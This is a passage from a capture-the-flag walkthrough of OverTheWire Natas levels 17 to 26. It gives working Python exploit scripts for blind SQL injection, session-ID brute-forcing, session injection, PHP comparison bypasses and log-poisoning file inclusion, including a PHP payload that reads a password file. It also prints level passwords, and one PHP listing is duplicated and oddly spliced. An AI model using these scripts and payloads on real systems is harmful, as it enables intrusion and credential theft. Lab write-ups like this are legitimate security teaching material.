we can append that character in seen_password by if (diff > 1)
```

Let write full python script

```py
import requests
import os,sys
from string import *
from time import *

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

characters = ascii_letters + digits
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()
seen_password = list()

while (len(seen_password) < 32):
	for ch in characters:
		start_time = time()
		print("Trying char :" , "".join(seen_password) + ch )
		query = 'natas18" AND password LIKE BINARY "' + "".join(seen_password) + ch +'%" AND SLEEP(1) #'
		response = session.post(url , data = { "username" : query } , auth=(username,password))
		content = response.text
		end_time = time()
		diff = end_time - start_time
		if (diff > 1):
			seen_password.append(ch)
		os.system(cmd)

flag = "".join(seen_password)
print("[+] Gotcha ",flag)

```

---

### Natas 18

<img src="img/Pasted image 20240505181008.png" alt="Example Image" width="1080"/>

we have to username and password for natas19 , let see [view-source](http://natas18.natas.labs.overthewire.org/index-source.html)

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if ($_REQUEST["username"] == "admin") {
        // This method of authentication appears to be unsafe and has been disabled for now.
        // return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) {
    if (array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() {
    if (array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if (!session_start()) {
            debug("Session start failed");
            return false;
        } else {
            debug("Session start ok");
            if (!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }
            return true;
        }
    }

    return false;
}

function print_credentials() {
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if (my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
        session_id(createID($_REQUEST["username"]));
        session_start();
        $_SESSION["admin"] = isValidAdminLogin();
        debug("New session started");
        $showform = false;
        print_credentials();
    }
}

if ($showform) {
?>

```

if `admin == 1` and it will print next level creds

```php
function print_credentials() {
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

as further analyzing the php file `$maxid = 640;`

```php
function createID($user) { /* {{{ */    global $maxid;
    return rand(1, $maxid);
}
```

It creating random id between 1 to 640 , ` session_id(createID($_REQUEST["username"]));`
and `isValidAdminLogin();` , let brute force `PHPSESSID` between 1 to 640 , if will manipulate with correct` __id__` , we will got You are an admin with credentials

```php
import requests
import sys,os
import re

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

username = "natas18"
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()
for _id_ in range(1,641):
	print("Trying PHPSESSID:",_id_)
	response = session.post(url , cookies={"PHPSESSID" : str(_id_) }, auth=(username,password))
	content = response.text
	if "You are an admin." in content:
		flag = re.findall("Username: natas19\nPassword: (.*)</pre>",content)[0]
		print("[+] Gotcha " ,flag)
		break
	os.system(cmd)
```

---

### Natas 19

<img src="img/Pasted image 20240505190226.png" alt="Example Image" width="1080"/>
Let's view source file [view-source](http://natas19.natas.labs.overthewire.org/index-source.html)

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function myhex2bin($h) { /* {{{ */
  if (!is_string($h)) return null;
  $r='';
  for ($a=0; $a<strlen($h); $a+=2) { $r.=chr(hexdec($h[$a].$h[($a+1)])); }
  return $r;
}
/* }}} */
function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    // must be lowercase
    if($id != strtolower($id)) {
        return false;
    }

    // must decode
    $decoded = myhex2bin($id);

    // must contain a number and a username
    if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
        return true;
    }

    return false;
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    $idnum = rand(1, $maxid);
    $idstr = "$idnum-$user";
    return bin2hex($idstr);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas20\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

**This page uses mostly the same code as the previous level, but session IDs are no longer sequential...**
Let see the PHPSESSID and got `3239372d`

```py
import requests

username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()

reponse = requests.post(url,data={"username":"", "password":""},auth=(username,password))
print(reponse.cookies['PHPSESSID'])
```

as we analyzed the php file and now we understand `id-admin` is bin2hex() used as `3239372d`

```php
function createID($user) { /* {{{ */
    global $maxid;
    $idnum = rand(1, $maxid);
    $idstr = "$idnum-$user";
    return bin2hex($idstr);
}
```

Let's write the full python script and brute force from `1-admin` to `640-admin` , each time we have convert from bin to hex , same as previous level

```py
import requests
import binascii
import re
import os,sys

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()

for i in range(1,641):
	__id__ = b"%d-admin"%i
	hex_enc  = str(binascii.hexlify(__id__))[2:-1]
	print("Trying PHPSESSID (%s):"%i, hex_enc)
	response = session.post(url , cookies={"PHPSESSID" : hex_enc }, auth=(username,password))
	content = response.text

	if "You are an admin." in content:
		flag = re.findall("Username: natas20\nPassword: (.*)</pre>" ,content)[0]
		print("[+] Gotcha :",flag)
		break
	os.system(cmd)

```

---

### Natas 20

<img src="img/Pasted image 20240505191435.png" alt="Example Image" width="1080"/>

Let's view source file [view-source](http://natas20.natas.labs.overthewire.org/index-source.html)

```php
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

Looks we can abuse custom session handlers

```php
session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();
```

it checking whether debug parameter in post request so use `debug=true` in URL

```php
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
```

And your name field as `name` in post request

```php
if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}
```

Looks like `$data` has been breakdown to `$line`

```php
$_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
```

at last we know if `admin == 1` , will return credential for next level

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
```

first we send `admin\nadmin 1` explode breakdown this string and by session handler `myread`
will assign `admin = 1` , and then session and again get request manipulate PHPSESSID previous session_id , this time assume that `admin == 1` and cookie id also same , print_creds

```py
import requests
import re

username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

url = "http://%s.natas.labs.overthewire.org?debug=true"%username
session = requests.Session()


response1 = session.post(url ,data={"name" : "admin\nadmin 1"}, auth=(username,password))
phpsessid = response1.cookies['PHPSESSID']
content1 = response1.text

response2 = requests.get(url,auth=(username,password), cookies={"PHPSESSID" : phpsessid})
content = response2.text

flag = re.findall("Username: natas21\nPassword: (.*)</pre>",content)[0]

print("[+] Gotcha" , flag)

```

---

### Natas21

<img src="img/Pasted image 20240505192943.png" alt="Example Image" width="1080"/>

**Note: this website is colocated with [http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org/)**
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.

let see the colocated site  [http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org/)

<img src="img/Pasted image 20240506182051.png" alt="Example Image" width="1080"/>

Php source of file website [view-source](http://natas21.natas.labs.overthewire.org/index-source.html)

```php
<?php
function print_credentials() { /* {{{ */    
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

Its same as previous levels , we also see source file of colocated site [view-source](http://natas21-experimenter.natas.labs.overthewire.org/index-source.html)

```php
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {    $val = $_SESSION[$key];
    } else {    $_SESSION[$key] = $val;
    }    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

Function `print_credentials()` in main page, checks if `$_SESSION` has `admin` parameter and if its value is equal to `1`

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
	print "You are an admin. The credentials for the next level are:<br>";
	print "<pre>Username: natas22\n";
	print "Password: <censored></pre>";
} else {
	print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
}
```

In "experimenter" page, if `$_REQUEST` contains `submit` key, all the contained attributes are saved in `$_SESSION`

```php
if(array_key_exists("submit", $_REQUEST)) {
	foreach($_REQUEST as $key => $val) {
		$_SESSION[$key] = $val;
	}
}
```

Well, the attack is defined. By passing `admin=1` in experimenter page, we will be able to get password for Natas22 . There is **Shared Resources Shared Risks**: Vulnerability in Colocated Website

we have give `admin=1` and `submit=1` in colocated site and get `cookies['PHPSESSID']`
and now manipulate the cookies , In second request in main site due to CORS Vulnerability , we give get the next level password

Let write the full python script

```py
import requests
import re

username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
url = "http://%s.natas.labs.overthewire.org"%username
exp = "http://natas21-experimenter.natas.labs.overthewire.org"

session = requests.Session()


response1 = session.post(exp,data={ "admin" : "1","submit" :"1" } ,auth=(username,password))
old_sess_id = response1.cookies['PHPSESSID']

response2 = session.get(url, cookies={"PHPSESSID" : old_sess_id } ,auth=(username,password))
content = response2.text

flag = re.findall("Username: natas22\nPassword: (.*)</pre>",content)[0]
print("[+] Gotcha ",flag)
```

---

### Natas 22

<img src="img/Pasted image 20240506183248.png" alt="Example Image" width="1080"/>

There is nothing in content of page , let see the source file [view-source](http://natas22.natas.labs.overthewire.org/index-source.html)

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

```php
<?php    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

there is `revelio` we have give `revilio=1` parameter in URL , so that it will print the next credentials , i tried with `revilio=1` parameter in URL , the page direction has been happening due to above php file , let disable page redirect by `allow_redirects=False` in requests module

```py
import requests
import re

username = "natas22"
passsowrd = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"

url = "http://%s.natas.labs.overthewire.org/?revelio=1"%username

sesssion = requests.Session()
response = sesssion.get(url,auth=(username,passsowrd) , allow_redirects=False )
content = response.text

flag = re.findall("Username: natas23\nPassword: (.*)</pre>",content)[0]

print("[+] Gotcha ",flag)
```

---

### Natas 23

<img src="img/Pasted image 20240506184056.png" alt="Example Image" width="1080"/>

There is only a single password field was there . let see the source file of page [view-source](http://natas23.natas.labs.overthewire.org/)

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

Above program say `strstr( passwd , "iloveyou")` & `pasword > 10` at the same time [strstr()](https://www.php.net/manual/en/function.strstr.php)
Find the first occurrence of a string , and password greater than 10 , let see php type juggling
we can give `11iloveyou` as parameter ,

PHP does not require explicit type definition in variable declaration. In this case, the type of a variable is determined by the value it stores. That is to say, if a [string](https://www.php.net/manual/en/language.types.string.php) is assigned to variable `$var` , then `$var` is of type [string](https://www.php.net/manual/en/language.types.string.php). If afterwards an [int](https://www.php.net/manual/en/language.types.integer.php) value is assigned to $var, it will be of type [int](https://www.php.net/manual/en/language.types.integer.php).

this tells us its , loose comparison when `11iloveyou > 10`

Let write full python script

```py
import requests
import re

username = "natas23"
passsowrd = "qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj"

url = "http://%s.natas.labs.overthewire.org/"%username

sesssion = requests.Session()
response = sesssion.post(url ,data={"passwd" : "11iloveyou"} ,auth=(username,passsowrd)  )
content = response.text

flag = re.findall("Username: natas24 Password: (.*)</pre>",content)[0]

print("[+] Gotcha ",flag)
```

---

### Natas 24

<img src="img/Pasted image 20240506185624.png" alt="Example Image" width="1080"/>

Pretty same as previous level , let see the source file [view-source](http://natas24.natas.labs.overthewire.org/index-source.html)

```php
<?php    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }    // morla / 10111
?>
```

password is checked by using `strcmp()` function. According to documentation, this function returns only values `> 0`, `< 0` and `= 0`. So our target is to have the return value equal to 0.
In PHP, `strcmp()` has a strange behaviour. Indeed, if the passed arguments are not string, it returns 0. So, let's try by passing the empty array `passwd[]`

[strcmp()](https://www.php.net/manual/en/function.strcmp.php) — Binary safe string comparison , Returns `-1` if `string1` is less than `string2`; `1` if `string1` is greater than `string2`, and `0` if they are equal.

```py
import requests
import re

username = "natas24"
passsowrd = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"

url = "http://%s.natas.labs.overthewire.org/"%username

sesssion = requests.Session()
response = sesssion.post(url,data={"passwd[]":"lol"},auth=(username,passsowrd) )
content = response.text

HashValue = re.findall(" natas25 Password: (.*)</pre>",content)[0]

print("[+] Gotcha ",HashValue)
```

---

### Natas 25

<img src="img/Pasted image 20240506190225.png" alt="Example Image" width="1080"/>

It look like there is a drop down menu (lang) for changing language in English and Dutch
let see the source file [view-source](http://natas25.natas.labs.overthewire.org/index-source.html)

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en");
    }

    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }

    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;

        closedir($handle);
        return $listoffiles;
    }

    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

At first look, seems that `lang` parameter could be the vehicle of the attack. According to the source code, some checks are performed on it . Firstly, we're not allowed to include `natas_webpass` string, so direct access to `/etc/natas_webpass/natas26` file is not feasible.

at `logRequest()` it storing the request , in the sever inside this location `/var/www/natas/natas25/logs/natas25_" . session_id() .".log` ,
`$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];` user agent header has been for this
The value of session_id() is controlled by us as it’s the value of PHPSESSID The User-Agent field is used to read the password file and the contents are put into `/var/www/natas/natas25/logs/natas25" . session_id() .".log` . You can create your own value of PHPSESSID, however, make sure to use the same value while creating the path.

Okay

```
headers = { "User-Agent" : "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" }
```

Inside User-Agent we give the payload read the password

Let Try File Inclusion but

```php
 if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
```

These Line replace `lang` parameter with `../` so we cannot use that sting , let use technique to bypass that check

```
"../" was repalced ""

Let try bracket string will replace with empty but still ../
..././ -> . (../) ./ -> ../

or

....// ->  .. (../) / -> ../
i am using second , but both are valid
```

we traversal , that log directory , get response from that header as will injected payload as response

```py
log_file = "....//....//....//....//....//var/www/natas/natas25/logs/natas25_%s.log"%session.cookies['PHPSESSID']
```

```json
headers = { "User-Agent" : "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" }
```

Let write full python script

```py
import requests
import re

username = "natas25"
passsowrd = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()
response = session.get(url,auth=(username,passsowrd))

# .. ../ / -> ....//
headers = { "User-Agent" : "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" }


log_file = "....//....//....//....//....//var/www/natas/natas25/logs/natas25_%s.log"%session.cookies['PHPSESSID']
response = session.post(url,headers=headers,data={"lang": log_file },auth=(username,passsowrd))
content = response.text
flag = re.findall('] (.*)\n "Directory traversal attempt! fixing request."',content)[0]
print("[+] Gotcha ", flag)

```

---

### Natas 26

<img src="img/Pasted image 20240507185620.png" alt="Example Image" width="1080"/>
<br>
<img src="img/Pasted image 20240507185702.png" alt="Example Image" width="1080"/>

Its Look like a drawing board based x1,x2,y1,y2 , the line is image based on their path `http://natas26.natas.labs.overthewire.org/img/natas26_eb2goiemjha4692ivh2guhov08.png`

Let see the source [view-source]()

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

```

it's look like cookies with id of `drawing` , can be useful let see ....

```php
 if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
```

The `drawImage()` function is called next. That function calls `drawFromUserdata()` which does a couple things. One, if you sent along coordinates it draws corresponding lines. Second, if you sent along the ‘drawing’ cookie, it deserializes the contents of the cookie and draws accordingly.

Seeing the word ‘unserialize’ in a hacking challenge should cause an alarm to go off in your head. This is what the deserialization looks like:

```
YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czozOiI1MDAiO3M6MjoieTIiO3M6MzoiNTAwIjt9fQ==
```

The cookies drawing has been decoded

```
b'a:1:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"500";s:2:"y2";s:3:"500";}}'
```

you can use below script to get that value

```py
import requests
import urllib.parse as urllib
import base64

username = "natas26"
passsowrd = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
url = "http://%s.natas.labs.overthewire.org/"%username

parameter = "? x1=0 & y1=0 & x2=500 & y2=500".replace(' ','')

session = requests.Session()
response = session.get(url + parameter,auth=(username,passsowrd))
decoded = base64.b64decode(urllib.unquote(session.cookies['drawing']))

print(urllib.unquote(session.cookies['drawing']))
print('\n\n')
print(decoded)
```

Those parameter are `unserailze()` are settled at cookies drawing

There is are constructor which log the session started in file we can use that area ,to file natas27 file

```php
   function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
